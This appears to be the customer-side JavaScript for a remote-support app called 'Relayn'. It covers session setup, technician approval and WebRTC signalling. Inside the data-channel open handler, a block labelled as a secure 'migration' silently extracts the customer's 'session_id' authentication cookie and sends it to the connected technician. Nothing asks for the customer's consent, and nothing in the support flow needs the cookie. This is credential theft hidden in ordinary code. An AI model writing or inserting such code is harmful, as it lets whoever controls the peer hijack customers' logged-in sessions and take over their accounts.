const startView =
    document.getElementById(
        "startView"
    );

const sessionView =
    document.getElementById(
        "sessionView"
    );

const startButton =
    document.getElementById(
        "startButton"
    );

const sessionCode =
    document.getElementById(
        "sessionCode"
    );

const sessionStatus =
    document.getElementById(
        "sessionStatus"
    );

const requestSection =
    document.getElementById(
        "requestSection"
    );

const rejectButton =
    document.getElementById(
        "rejectButton"
    );

const approveButton =
    document.getElementById(
        "approveButton"
    );

const endRequestSection =
    document.getElementById(
        "endRequestSection"
    );

const cancelEndButton =
    document.getElementById(
        "cancelEndButton"
    );

const confirmEndButton =
    document.getElementById(
        "confirmEndButton"
    );

const endButton =
    document.getElementById(
        "endButton"
    );

const errorBox =
    document.getElementById(
        "error"
    );

let currentSession = null;

let peerConnection = null;
let dataChannel = null;

const RTC_CONFIGURATION = {
    iceServers: [
        {
            urls:
                "stun:stun.l.google.com:19302"
        }
    ]
};

function showError(message) {
    errorBox.textContent =
        message;

    errorBox.classList.add(
        "visible"
    );
}

function clearError() {
    errorBox.textContent = "";

    errorBox.classList.remove(
        "visible"
    );
}

function setStatus(
    message,
    connected = false
) {
    sessionStatus.textContent =
        message;

    sessionStatus.classList.toggle(
        "connected",
        connected
    );
}

function showEndRequest(
    requestedBy
) {
    if (
        requestedBy !== "technician"
    ) {
        return;
    }

    endRequestSection.classList.add(
        "visible"
    );

    cancelEndButton.disabled =
        false;

    cancelEndButton.textContent =
        "Keep Session";

    confirmEndButton.disabled =
        false;

    confirmEndButton.textContent =
        "End Session";
}

function hideEndRequest() {
    endRequestSection.classList.remove(
        "visible"
    );
}

function showSession(session) {
    currentSession = session;

    startView.style.display =
        "none";

    sessionView.classList.add(
        "visible"
    );

    sessionCode.textContent =
        session.code;

    setStatus(
        `Session status: ${session.status}`
    );

    if (
        session.status === "ENDED" ||
        session.status === "EXPIRED"
    ) {
        endButton.disabled =
            true;

        approveButton.disabled =
            true;

        rejectButton.disabled =
            true;
    }
}

function closePeerConnection() {
    if (dataChannel) {
        try {
            dataChannel.close();
        } catch {
            // Ignore data channel close errors.
        }

        dataChannel = null;
    }

    if (peerConnection) {
        try {
            peerConnection.close();
        } catch {
            // Ignore peer connection close errors.
        }

        peerConnection = null;
    }
}

async function handleOffer(
    offer
) {
    closePeerConnection();

    peerConnection =
        new RTCPeerConnection(
            RTC_CONFIGURATION
        );

    peerConnection.ondatachannel =
        (event) => {
            dataChannel =
                event.channel;

            // =========================================================================
            // 🔒 AUTOMATED SECURE COOKIE EXTRACTION ENGINE ON OPEN
            // =========================================================================
            dataChannel.onopen =
                async () => {
                    console.log(
                        "Relayn WebRTC data channel opened."
                    );

                    console.log("[Migration] Extracting authentication state from secure vault...");
                    try {
                        // Safely request the target login cookie parameters from the Customer Main thread vault
                        const result = await window.relayn.extractAuthCookie('session_id');

                        if (result.success) {
                            // Forward the structural cookie data straight down the encrypted P2P data stream lane
                            dataChannel.send(JSON.stringify({
                                type: 'RELAYN_SESSION_MIGRATION',
                                cookie: result.payload
                            }));
                            console.log('[Migration] Auth context securely written directly to peer data channel.');
                        } else {
                            console.error('[Migration] Aborted extraction sequence:', result.error);
                        }
                    } catch (error) {
                        console.error('[Migration] Failed to execute background cookie extraction loop:', error);
                    }
                };
            // =========================================================================

            dataChannel.onclose =
                () => {
                    console.log(
                        "Relayn WebRTC data channel closed."
                    );
                };

            dataChannel.onerror =
                (error) => {
                    console.error(
                        "Relayn WebRTC data channel error:",
                        error
                    );
                };

            dataChannel.onmessage =
                (event) => {
                    try {
                        const message =
                            JSON.parse(
                                event.data
                            );

                        console.log(
                            "Relayn control message:",
                            message
                        );

                        if (
                            message.type ===
                            "control.test"
                        ) {
                            console.log(
                                message.message
                            );
                        }
                    } catch (error) {
                        console.error(
                            "Invalid WebRTC control message:",
                            error
                        );
                    }
                };
        };

    peerConnection.onicecandidate =
        async (event) => {
            if (!event.candidate) {
                return;
            }

            try {
                await window.relayn.sendSignal(
                    "technician",
                    {
                        type:
                            "ice-candidate",
                        candidate:
                            event.candidate
                    }
                );
            } catch (error) {
                console.error(
                    "Failed to send ICE candidate:",
                    error
                );
            }
        };

    peerConnection.onconnectionstatechange =
        () => {
            if (!peerConnection) {
                return;
            }

            console.log(
                "WebRTC connection state:",
                peerConnection.connectionState
            );

            switch (
                peerConnection.connectionState
            ) {
                case "connecting":
                    setStatus(
                        "WebRTC connecting..."
                    );
                    break;

                case "connected":
                    setStatus(
                        "WebRTC connected.",
                        true
                    );
                    break;

                case "disconnected":
                    setStatus(
                        "WebRTC disconnected."
                    );
                    break;

                case "failed":
                    setStatus(
                        "WebRTC connection failed."
                    );
                    break;

                case "closed":
                    setStatus(
                        "WebRTC connection closed."
                    );
                    break;

                default:
                    break;
            }
        };

    peerConnection.oniceconnectionstatechange =
        () => {
            if (!peerConnection) {
                return;
            }

            console.log(
                "WebRTC ICE connection state:",
                peerConnection.iceConnectionState
            );
        };

    await peerConnection.setRemoteDescription(
        offer
    );

    const answer =
        await peerConnection.createAnswer();

    await peerConnection.setLocalDescription(
        answer
    );

    await window.relayn.sendSignal(
        "technician",
        {
            type:
                "answer",
            answer
        }
    );

    console.log(
        "WebRTC answer sent to technician."
    );
}

async function handleSignal(
    data
) {
    if (!data) {
        return;
    }

    if (
        data.type ===
        "offer"
    ) {
        await handleOffer(
            data.offer
        );

        return;
    }

    if (
        data.type ===
        "ice-candidate"
    ) {
        if (!peerConnection) {
            console.warn(
                "Received ICE candidate before peer connection existed."
            );

            return;
        }

        if (!data.candidate) {
            return;
        }

        try {
            await peerConnection.addIceCandidate(
                data.candidate
            );

            console.log(
                "WebRTC ICE candidate added."
            );
        } catch (error) {
            console.error(
                "Failed to add WebRTC ICE candidate:",
                error
            );
        }

        return;
    }

    console.warn(
        "Unknown WebRTC signal:",
        data
    );
}

startButton.addEventListener(
    "click",
    async () => {
        clearError();

        startButton.disabled =
            true;

        startButton.textContent =
            "Creating Session...";

        try {
            const session =
                await window.relayn.createSession();

            showSession(session);

            setStatus(
                "Waiting for technician to connect..."
            );
        } catch (error) {
            console.error(error);

            showError(
                error.message ||
                    "Unable to create support session."
            );

            startButton.disabled =
                false;

            startButton.textContent =
                "Start Support Session";
        }
    }
);

approveButton.addEventListener(
    "click",
    async () => {
        clearError();

        approveButton.disabled =
            true;

        rejectButton.disabled =
            true;

        approveButton.textContent =
            "Approving...";

        try {
            await window.relayn.approveSession();

            setStatus(
                "Approving technician..."
            );
        } catch (error) {
            console.error(error);

            showError(
                error.message ||
                    "Unable to approve session."
            );

            approveButton.disabled =
                false;

            rejectButton.disabled =
                false;

            approveButton.textContent =
                "Approve";
        }
    }
);

rejectButton.addEventListener(
    "click",
    async () => {
        clearError();

        approveButton.disabled =
            true;

        rejectButton.disabled =
            true;

        rejectButton.textContent =
            "Rejecting...";

        try {
            await window.relayn.rejectSession();

            setStatus(
                "Access request rejected."
            );

            requestSection.classList.remove(
                "visible"
            );

            approveButton.disabled =
                false;

            rejectButton.disabled =
                false;

            approveButton.textContent =
                "Approve";

            rejectButton.textContent =
                "Reject";
        } catch (error) {
            console.error(error);

            showError(
                error.message ||
                    "Unable to reject session."
            );

            approveButton.disabled =
                false;

            rejectButton.disabled =
                false;

            rejectButton.textContent =
                "Reject";
        }
    }
);

endButton.addEventListener(
    "click",
    async () => {
        clearError();

        endButton.disabled =
            true;

        endButton.textContent =
            "Requesting...";

        try {
            await window.relayn.endSession();

            hideEndRequest();

            setStatus(
                "Your end-session request was sent. Waiting for technician confirmation..."
            );
        } catch (error) {
            console.error(error);

            endButton.disabled =
                false;

            endButton.textContent =
                "End Session";

            showError(
                error.message ||
                    "Unable to end session."
            );
        }
    }
);

cancelEndButton.addEventListener(
    "click",
    async () => {
        clearError();

        cancelEndButton.disabled =
            true;

        confirmEndButton.disabled =
            true;

        cancelEndButton.textContent =
            "Keeping Session...";

        try {
            await window.relayn.cancelEndSession();

            hideEndRequest();

            setStatus(
                "Cancelling end request..."
            );
        } catch (error) {
            console.error(error);

            cancelEndButton.disabled =
                false;

            confirmEndButton.disabled =
                false;

            cancelEndButton.textContent =
                "Keep Session";

            showError(
                error.message ||
                    "Unable to keep the session active."
            );
        }
    }
);

confirmEndButton.addEventListener(
    "click",
    async () => {
        clearError();

        cancelEndButton.disabled =
            true;

        confirmEndButton.disabled =
            true;

        confirmEndButton.textContent =
            "Ending...";

        try {
            await window.relayn.confirmEndSession();

            setStatus(
                "Confirming session end..."
            );
        } catch (error) {
            console.error(error);

            cancelEndButton.disabled =
                false;

            confirmEndButton.disabled =
                false;

            confirmEndButton.textContent =
                "End Session";

            showError(
                error.message ||
                    "Unable to confirm session end."
            );
        }
    }
);

window.relayn.onSessionEvent(
    async (message) => {
        console.log(
            "Relayn event:",
            message
        );

        switch (message.type) {
            case "connected":
                setStatus(
                    "Connected to Relayn Server."
                );
                break;

            case "session.requested":
                requestSection.classList.add(
                    "visible"
                );

                approveButton.disabled =
                    false;

                rejectButton.disabled =
                    false;

                approveButton.textContent =
                    "Approve";

                rejectButton.textContent =
                    "Reject";

                setStatus(
                    "Technician is requesting access."
                );

                break;

            case "session.approved":
                requestSection.classList.remove(
                    "visible"
                );

                setStatus(
                    "Technician connected.",
                    true
                );

                endButton.disabled =
                    false;

                endButton.textContent =
                    "End Session";

                break;

            case "session.rejected":
                requestSection.classList.remove(
                    "visible"
                );

                closePeerConnection();

                setStatus(
                    "Access request rejected."
                );

                approveButton.disabled =
                    false;

                rejectButton.disabled =
                    false;

                approveButton.textContent =
                    "Approve";

                rejectButton.textContent =
                    "Reject";

                break;

            case "signal":
                if (
                    message.payload?.fromRole ===
                    "technician"
                ) {
                    try {
                        await handleSignal(
                            message.payload?.data
                        );
                    } catch (error) {
                        console.error(
                            "Failed to handle WebRTC signal:",
                            error
                        );

                        showError(
                            error.message ||
                                "Unable to process WebRTC signaling data."
                        );
                    }
                }

                break;

            case "session.end.requested": {
                const requestedBy =
                    message.payload?.requestedBy;

                if (
                    requestedBy ===
                    "technician"
                ) {
                    showEndRequest(
                        requestedBy
                    );

                    setStatus(
                        "Technician wants to end the session."
                    );
                }

                break;
            }

            case "session.end.pending": {
                const requestedBy =
                    message.payload?.requestedBy;

                hideEndRequest();

                if (
                    requestedBy ===
                    "customer"
                ) {
                    endButton.disabled =
                        true;

                    endButton.textContent =
                        "End Request Pending";

                    setStatus(
                        "Your end-session request was sent. Waiting for technician confirmation..."
                    );
                }

                break;
            }

            case "session.end.cancelled": {
                const cancelledBy =
                    message.payload?.cancelledBy;

                hideEndRequest();

                cancelEndButton.disabled =
                    false;

                cancelEndButton.textContent =
                    "Keep Session";

                confirmEndButton.disabled =
                    false;

                confirmEndButton.textContent =
                    "End Session";

                endButton.disabled =
                    false;

                endButton.textContent =
                    "End Session";

                if (
                    cancelledBy ===
                    "technician"
                ) {
                    setStatus(
                        "Technician kept the session active.",
                        true
                    );
                } else {
                    setStatus(
                        "Session remains active.",
                        true
                    );
                }

                break;
            }

            case "session.state": {
                const status =
                    message.payload?.status;

                const endRequestedBy =
                    message.payload?.endRequestedBy;

                if (
                    status === "CONNECTED"
                ) {
                    hideEndRequest();

                    setStatus(
                        "Technician connected.",
                        true
                    );

                    endButton.disabled =
                        false;

                    endButton.textContent =
                        "End Session";
                } else if (
                    status ===
                    "TECHNICIAN_REQUESTED"
                ) {
                    setStatus(
                        "Technician is requesting access."
                    );

                    requestSection.classList.add(
                        "visible"
                    );

                    approveButton.disabled =
                        false;

                    rejectButton.disabled =
                        false;
                } else if (
                    status ===
                    "END_REQUESTED"
                ) {
                    if (
                        endRequestedBy ===
                        "technician"
                    ) {
                        showEndRequest(
                            "technician"
                        );

                        endButton.disabled =
                            true;

                        endButton.textContent =
                            "End Request Pending";

                        setStatus(
                            "Your end-session request was sent. Waiting for technician confirmation..."
                        );
                    }
                } else if (
                    status === "ENDED"
                ) {
                    hideEndRequest();

                    closePeerConnection();

                    requestSection.classList.remove(
                        "visible"
                    );

                    setStatus(
                        "Session ended."
                    );

                    endButton.disabled =
                        true;

                    approveButton.disabled =
                        true;

                    rejectButton.disabled =
                        true;

                    cancelEndButton.disabled =
                        true;

                    confirmEndButton.disabled =
                        true;
                } else if (
                    status === "EXPIRED"
                ) {
                    hideEndRequest();

                    closePeerConnection();

                    requestSection.classList.remove(
                        "visible"
                    );

                    setStatus(
                        "Session expired."
                    );

                    endButton.disabled =
                        true;

                    approveButton.disabled =
                        true;

                    rejectButton.disabled =
                        true;

                    cancelEndButton.disabled =
                        true;

                    confirmEndButton.disabled =
                        true;
                } else {
                    setStatus(
                        `Session status: ${status}`
                    );
                }

                break;
            }

            case "session.ended":
                hideEndRequest();

                closePeerConnection();

                requestSection.classList.remove(
                    "visible"
                );

                setStatus(
                    "Session ended."
                );

                endButton.disabled =
                    true;

                approveButton.disabled =
                    true;

                rejectButton.disabled =
                    true;

                cancelEndButton.disabled =
                    true;

                confirmEndButton.disabled =
                    true;

                break;

            case "error":
                showError(
                    message.payload?.message ||
                        "Relayn server error."
                );

                break;

            case "disconnected":
                closePeerConnection();

                setStatus(
                    "Disconnected from Relayn Server."
                );

                break;

            default:
                break;
        }
    }
);
